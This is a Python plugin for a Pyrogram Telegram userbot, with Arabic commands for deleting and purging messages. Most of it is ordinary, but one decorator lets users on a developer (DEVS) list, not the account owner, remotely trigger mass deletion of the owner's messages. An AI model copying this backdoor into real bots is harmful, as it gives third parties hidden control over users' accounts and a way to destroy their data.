
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message 
from pyrogram.errors import FloodWait
from . import *

@Ubot(["حذف"], "")
async def del_msg(client: Client, message: Message):
    msg_src = message.reply_to_message
    if msg_src:
        if msg_src.from_user.id:
            try:
                await client.delete_messages(message.chat.id, msg_src.id)
                await message.delete()
            except BaseException:
                pass
    else:
        await message.delete()



@Ubot(["مسح"], "")
async def purge(client: Client, message: Message):
    ex = await message.edit_text("`البدء بتنظيف الرسائل!`")
    msg = message.reply_to_message
    if msg:
        itermsg = list(range(msg.id, message.id))
    else:
        await ex.edit("`الرد على رسالة للحذف!`")
        return
    count = 0

    for i in itermsg:
        try:
            count = count + 1
            await client.delete_messages(
                chat_id=message.chat.id, message_ids=i, revoke=True
            )
        except FloodWait as e:
            await asyncio.sleep(e.x)
        except Exception as e:
            await ex.edit(f"**خطأ:** `{e}`")
            return

    done = await ex.edit(
        f"**تم الانتهاء!**\n**من حذف** `{str(count)}` **رسالة.**"
    )
    await asyncio.sleep(2)
    await done.delete()

@Client.on_message(
    filters.command(["cاحذف"], "") & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command(["احذف"], "") & filters.me)
async def purgeme(client: Client, message: Message):
    if len(message.command) != 2:
        return await message.delete()
    n = message.text.split(None, 1)[1].strip()
    if not n.isnumeric():
        return await message.edit_text("رجاءا ضع رقم")
    n = int(n)
    if n < 1:
        return await message.edit_text("ضع الرقم الذي تود تنظيفه!")
    chat_id = message.chat.id
    message_ids = [
        m.id
        async for m in client.search_messages(
            chat_id,
            from_user="me",
            limit=n,
        )
    ]
    if not message_ids:
        return await message.edit_text("Could not find message.")
    to_delete = [message_ids[i : i + 99] for i in range(0, len(message_ids), 99)]
    for hundred_messages_or_less in to_delete:
        await client.delete_messages(
            chat_id=chat_id,
            message_ids=hundred_messages_or_less,
            revoke=True,
        )
    await message.delete()


add_command_help(
    "Purge",
    [
        [f"حذف", "لحذف الرسالة."],
        [f"مسح", "للمسح من الرسالة التي تحددها"],
        [f"احذف [العدد]", "لحذف الرسائل بالعدد"],
    ],
)
